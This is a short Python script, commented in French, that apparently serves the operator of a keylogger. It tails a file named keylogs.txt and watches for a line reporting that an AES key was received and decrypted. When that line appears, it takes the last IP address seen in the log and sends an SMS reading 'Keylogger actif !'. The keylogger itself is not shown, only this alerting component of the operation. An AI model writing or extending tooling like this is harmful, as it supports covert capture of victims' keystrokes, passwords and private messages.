import subprocess
import re
import time

fichier = "~/keylogger/keylogs.txt"
mot_cle = "Clé AES reçue et déchiffrée"

def extraire_ip(ligne):
    # Extraire une adresse IP au format classique, où qu’elle soit dans la ligne
    match = re.search(r"(?:\d{1,3}\.){3}\d{1,3}", ligne)
    return match.group(0) if match else None

def action_sur_detection(ip):
    message = f"Clé AES reçue et déchiffrée depuis {ip if ip else 'IP inconnue'} ->  Keylogger actif !"
    print("Mot-clé détecté :", message)
    subprocess.run(['/usr/local/bin/sms', message])

last_ip = None

with open(fichier, "r") as f:
    f.seek(0, 2)  # Aller à la fin du fichier
    while True:
        ligne = f.readline()
        if not ligne:
            time.sleep(5)
            continue
        ip = extraire_ip(ligne)
        if ip:
            last_ip = ip
        if mot_cle in ligne:
            action_sur_detection(last_ip)
            break
